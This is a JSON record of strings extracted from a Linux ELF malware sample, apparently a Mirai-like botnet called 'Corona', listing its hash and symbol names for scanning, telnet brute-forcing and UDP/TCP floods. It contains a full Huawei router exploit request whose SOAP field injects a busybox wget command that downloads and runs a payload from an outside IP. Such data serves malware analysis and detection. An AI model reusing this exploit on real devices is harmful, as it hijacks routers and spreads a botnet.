{
    "malware_data": [
        {
            "filename": "6839f298def7b6c2053c9f9d5de35896d33b5d373b9839b0ae57c98420338a14.elf",
            "filetype": "7F454C46",
            "filesize": "63KB",
            "hash_sha256": "6839f298def7b6c2053c9f9d5de35896d33b5d373b9839b0ae57c98420338a14",
            "strings": [
                "VUUU",
                "//x/",
                "e/t/",
                "TSou",
                "rce ",
                "Engi",
                "ne Q",
                "uery",
                "namef",
                "archf",
                "31m[",
                "36mC",
                "oron",
                ";31m",
                "@$m De",
                "@(vice",
                "@, Joi",
                "@0ned ",
                "@4As [",
                "gfff",
                " <~t6",
                " <>t$",
                " <$t",
                " <#u",
                "D$ H",
                "ATHc",
                "[]A\\",
                "T$0t$H",
                "D$(H",
                "D$0H",
                "D$8H",
                "D$@H",
                "D$HH",
                "D$XH",
                "D$hH",
                "D$PH",
                "D$`H",
                "D$pH",
                "CpX[A\\",
                "CpZ[A\\",
                "ATUH",
                " []A\\",
                "D$8H=",
                "sYH1",
                "s?H1",
                "s%H1",
                "s~I1",
                "s]I1",
                "s<I1",
                "szI1",
                "sYI1",
                "s8I1",
                "AUATUSH",
                "t]r@H",
                "_(tr",
                "Z[]A\\A]L",
                "A^A_",
                "AVAUATUSH",
                "F H9",
                "L#d$",
                "*H#D$",
                "twL)",
                "H;L$",
                "[]A\\A]A^A_",
                "AWAVAUATUH",
                "@ H9",
                "G v%H",
                "9L;d$",
                "ATUSH",
                "E`I9",
                "E`I)",
                "Z[]A\\A]",
                "uEH9J",
                "H;s`t\\B",
                "Y[]A\\A]",
                "uHH9y",
                "H;5E.",
                "HcD$,H",
                "ATSH",
                "[A\\A]",
                "[A\\A]A^A_",
                "([A\\",
                "wUHc",
                "N t\"",
                ">tvD",
                "HcE H",
                "Y^[]",
                "_[]A\\A]",
                "AVAUATU",
                " <xu",
                "\"wsLc",
                "D#l$",
                "[]A\\A]A^A_H",
                "[]A\\A]",
                "tFH;",
                "AUATA",
                "AVAUATSH",
                " x5ff",
                ".u1H",
                " t!A",
                "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1",
                "Content-Length: 430",
                "Connection: keep-alive",
                "Accept: */*",
                "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"",
                "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 91.92.251.81 -l /tmp/mips -r /mips; /bin/busybox chmod 777 * /tmp/mips; /tmp/mips huawei.rep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>",
                "/lib/",
                "/lib64/",
                "//x/e/t/",
                "] Arch: [",
                "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
                "M$65&6SRS=",
                "M$65&6SRS>B",
                "TZ@b",
                "SRRS",
                "\"PQV[WZW[",
                "%/ZSZP",
                "QWSZ",
                "SPQV",
                "QWSS",
                "VVLGV",
                "84.54.51.37",
                "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                "/dev/null",
                "CAk[S",
                "GCC: (GNU) 4.1.2",
                ".symtab",
                ".strtab",
                ".shstrtab",
                ".init",
                ".text",
                ".fini",
                ".rodata",
                ".eh_frame",
                ".ctors",
                ".dtors",
                ".jcr",
                ".data",
                ".bss",
                ".comment",
                "libc/sysdeps/linux/x86_64/crti.S",
                "crtstuff.c",
                "__CTOR_LIST__",
                "__DTOR_LIST__",
                "__EH_FRAME_BEGIN__",
                "__JCR_LIST__",
                "completed.2761",
                "p.2759",
                "__do_global_dtors_aux",
                "object.2814",
                "frame_dummy",
                "__CTOR_END__",
                "__DTOR_END__",
                "__FRAME_END__",
                "__JCR_END__",
                "__do_global_ctors_aux",
                "initfini.c",
                "libc/sysdeps/linux/x86_64/crtn.S",
                "libc/sysdeps/linux/x86_64/crt1.S",
                "checksum.c",
                "csum.c",
                "enc.c",
                "huawei_scanner.c",
                "huaweiscanner_get_random_ip",
                "huaweiscanner_setup_connection",
                "killer.c",
                "check_static",
                "main.c",
                "find_signature",
                "machine_to_str",
                "read_elf",
                "udp_flood",
                "udpplain_flood",
                "tcp_flood",
                "attack_parser",
                "rand.c",
                "charset.2174",
                "table.c",
                "add_entry",
                "toggle_obf",
                "telnet.c",
                "add_auth_entry",
                "get_random_ip",
                "setup_connection",
                "random_auth_entry",
                "consume_iacs",
                "consume_user_prompt",
                "consume_pass_prompt",
                "consume_any_prompt",
                "consume_resp_prompt",
                "report_working",
                "can_consume",
                "deobf",
                "util.c",
                "util_isspace",
                "util_isdigit",
                "util_isalpha",
                "util_isupper",
                "utils.c",
                "__syscall_fcntl.c",
                "_exit.c",
                "chdir.c",
                "close.c",
                "fork.c",
                "fstat.c",
                "getpid.c",
                "getppid.c",
                "kill.c",
                "open.c",
                "prctl.c",
                "read.c",
                "select.c",
                "time.c",
                "write.c",
                "xstatconv.c",
                "closedir.c",
                "opendir.c",
                "readdir.c",
                "__errno_location.c",
                "clock.c",
                "libc/string/x86_64/memset.S",
                "libc/string/x86_64/strcat.S",
                "libc/string/x86_64/strcpy.S",
                "memmove.c",
                "strstr.c",
                "ntohl.c",
                "inet_makeaddr.c",
                "connect.c",
                "getsockname.c",
                "getsockopt.c",
                "recv.c",
                "recvfrom.c",
                "send.c",
                "sendto.c",
                "setsockopt.c",
                "socket.c",
                "signal.c",
                "sigsetops.c",
                "malloc.c",
                "__malloc_largebin_index",
                "calloc.c",
                "realloc.c",
                "free.c",
                "__malloc_trim",
                "abort.c",
                "mylock",
                "been_there_done_that",
                "random.c",
                "unsafe_state",
                "randtbl",
                "random_r.c",
                "random_poly_info",
                "atoi.c",
                "strtol.c",
                "_stdlib_strto_l.c",
                "exit.c",
                "sleep.c",
                "sysconf.c",
                "__uClibc_main.c",
                "__pthread_return_0",
                "__pthread_return_void",
                "__check_one_fd",
                "been_there_done_that.3160",
                "sigaction.c",
                "__restore_rt",
                "mmap.c",
                "clock_getres.c",
                "getdents64.c",
                "getdtablesize.c",
                "getegid.c",
                "geteuid.c",
                "getgid.c",
                "getpagesize.c",
                "getrlimit.c",
                "getuid.c",
                "llseek.c",
                "lseek.c",
                "mremap.c",
                "munmap.c",
                "nanosleep.c",
                "sbrk.c",
                "sigprocmask.c",
                "times.c",
                "__C_ctype_b.c",
                "errno.c",
                "libc/string/x86_64/memcpy.S",
                "inet_aton.c",
                "raise.c",
                "dl-support.c",
                "brk.c",
                "__fini_array_end",
                "__fini_array_start",
                "__init_array_end",
                "__preinit_array_end",
                "__init_array_start",
                "__preinit_array_start",
                "__libc_sigaction",
                "strcpy",
                "__GI_fcntl64",
                "__GI___ctype_b",
                "huaweiscanner_scanner_rawpkt",
                "ascii_proc",
                "conn_table",
                "getrlimit",
                "__GI_initstate_r",
                "__GI_sigaction",
                "__GI_time",
                "getgid",
                "sysconf",
                "random",
                "__GI_getpagesize",
                "getdtablesize",
                "__GI_h_errno",
                "recv",
                "connect",
                "__GI___uClibc_fini",
                "generate_random_string",
                "__pthread_mutex_lock",
                "__sigdelset",
                "util_stristr",
                "__GI_clock_getres",
                "__uClibc_fini",
                "geteuid",
                "__getdents",
                "memmove",
                "__bsd_signal",
                "munmap",
                "__GI_setsockopt",
                "__libc_stack_end",
                "__libc_fcntl",
                "_h_errno",
                "times",
                "__ctype_b",
                "strtoimax",
                "__GI_random_r",
                "rsck",
                "errno",
                "getegid",
                "__GI_sbrk",
                "__GI___uClibc_init",
                "getpagesize",
                "getpid",
                "util_strncmp",
                "__GI_lseek64",
                "setstate_r",
                "__libc_getpid",
                "util_fdgets",
                "fcntl64",
                "getrlimit64",
                "prctl",
                "memcpy",
                "mem_exists",
                "rand_int",
                "creat",
                "rand_init",
                "__libc_select",
                "recv_strip_null",
                "__libc_nanosleep",
                "__pthread_mutex_init",
                "getuid",
                "util_strcat",
                "malloc",
                "table_unlock_val",
                "sleep",
                "strtoll",
                "__GI_read",
                "recvfrom",
                "random_r",
                "__dso_handle",
                "itoa",
                "__GI_readdir",
                "clock_getres",
                "tcpcsum",
                "read_set",
                "ascii_M68K",
                "socket",
                "select",
                "_pthread_cleanup_pop_restore",
                "readdir",
                "__GI___libc_fcntl",
                "__GI_memset",
                "__GI_closedir",
                "ascii_SH4",
                "util_atoi",
                "__GI_write",
                "util_memsearch",
                "__libc_read",
                "__GI_opendir",
                "__GI_open",
                "lseek",
                "ascii_MIPS",
                "__environ",
                "mmap",
                "send",
                "abort",
                "__GI_fcntl",
                "__GI_getgid",
                "srandom_r",
                "fstat64",
                "_init",
                "__GI_setstate_r",
                "strtol",
                "__libc_lseek64",
                "__malloc_state",
                "__GI___C_ctype_b_data",
                "ascii_M88K",
                "table",
                "scanner_kill",
                "__sigaddset",
                "nanosleep",
                "__GI_send",
                "h_errno",
                "calloc",
                "__pthread_mutex_unlock",
                "__GI_exit",
                "__app_fini",
                "csum",
                "__exit_cleanup",
                "__GI_srandom_r",
                "write",
                "environ",
                "__GI_close",
                "fstat",
                "kill",
                "__pthread_mutex_trylock",
                "huaweiscanner_rsck",
                "strcat",
                "__GI_brk",
                "__GI_strcat",
                "__GI_nanosleep",
                "ascii_exe",
                "LOCAL_ADDR",
                "__GI_sigprocmask",
                "inet_addr",
                "ntohl",
                "__deregister_frame_info",
                "util_strlen",
                "chdir",
                "util_zero",
                "huaweiscanner_rsck_out",
                "__raise",
                "setsockopt",
                "bsd_signal",
                "__GI_times",
                "huaweiscanner_scanner_kill",
                "mremap",
                "__GI_kill",
                "__GI_memmove",
                "setstate",
                "__pthread_initialize_minimal",
                "__GI_recv",
                "_start",
                "strings",
                "strstr",
                "rand",
                "signal",
                "read",
                "__xstat64_conv",
                "__GI_memcpy",
                "table_retrieve_val",
                "htonl",
                "sendto",
                "__GI___C_ctype_b",
                "scanner_init",
                "table_key",
                "realloc",
                "__libc_send",
                "killer_init",
                "__GI_recvfrom",
                "__GI_getrlimit",
                "__GI_strcpy",
                "malloc_trim",
                "fork",
                "ascii_killme",
                "ascii_ARM",
                "rand_next",
                "__GI_sleep",
                "sigaction",
                "_dl_phdr",
                "ascii_SPC",
                "__uClibc_init",
                "__GI_munmap",
                "ascii_UNKNOWN",
                "__getpagesize",
                "__GI_random",
                "__GI_mremap",
                "__uclibc_progname",
                "__GI_getegid",
                "__malloc_lock",
                "__uClibc_main",
                "sbrk",
                "__rtld_fini",
                "__GI_fork",
                "__libc_close",
                "__GI_getpid",
                "inet_aton",
                "util_memcpy",
                "_pthread_cleanup_push_defer",
                "__sigismember",
                "__bss_start",
                "__libc_open",
                "memset",
                "scanner_pid",
                "__GI_socket",
                "main",
                "__GI___libc_lseek",
                "ascii_maps",
                "util_local_addr",
                "srand",
                "table_lock_val",
                "initstate",
                "__xstat_conv",
                "ntohs",
                "getppid",
                "__libc_recvfrom",
                "time",
                "opendir",
                "checksum_generic",
                "__GI_abort",
                "__GI__exit",
                "data_start",
                "__GI_sysconf",
                "__h_errno_location",
                "__C_ctype_b_data",
                "util_itoa",
                "_fini",
                "__GI_chdir",
                "__GI_mmap",
                "huaweiscanner_scanner_pid",
                "__GI_select",
                "_stdio_term",
                "__GI_signal",
                "__C_ctype_b",
                "srandom",
                "huaweiscanner_recv_strip_null",
                "__GI_sendto",
                "ascii_PPC",
                "__libc_fork",
                "ascii_X86",
                "__atexit_lock",
                "add_strings",
                "huaweiscanner_scanner_init",
                "auth_table_max_weight",
                "__libc_lseek",
                "util_strcmp",
                "__libc_fcntl64",
                "getsockopt",
                "killer_pid",
                "__pagesize",
                "__GI_getdtablesize",
                "_edata",
                "write_set",
                "__GI_strstr",
                "__GI_fstat",
                "_end",
                "htons",
                "ascii_Corona",
                "util_strcpy",
                "_sigintr",
                "initstate_r",
                "__GI_connect",
                "__curbrk",
                "_dl_phnum",
                "scanner_rawpkt",
                "__errno_location",
                "_stdlib_strto_l",
                "__GI___libc_open",
                "exit",
                "_stdio_init",
                "__GI_geteuid",
                "auth_table_len",
                "checksum_tcpudp",
                "huaweiscanner_fake_time",
                "_dl_aux_init",
                "table_init",
                "_errno",
                "atoi",
                "__GI_inet_aton",
                "auth_table",
                "_exit",
                "__GI_lseek",
                "__GI_strtoll",
                "__libc_recv",
                "__getdents64",
                "__libc_creat",
                "lseek64",
                "open",
                "__libc_write",
                "__malloc_consolidate",
                "__GI_strtol",
                "__GI_getuid",
                "clock",
                "__GI_errno",
                "__libc_sendto",
                "fake_time",
                "ascii_MIPSEL",
                "__GI_raise",
                "__data_start",
                "__GI_inet_addr",
                "closedir",
                "_Jv_RegisterClasses",
                "__GI___errno_location",
                "fcntl",
                "rsck_out",
                "__GI_atoi",
                "__register_frame_info",
                "__GI_getsockname",
                "close",
                "__libc_connect",
                "check_exe",
                "__GI_fstat64",
                "raise",
                "free",
                "deobfuscateString",
                "sigprocmask",
                "getsockname",
                "cxyzw"
            ]
        }
    ]
}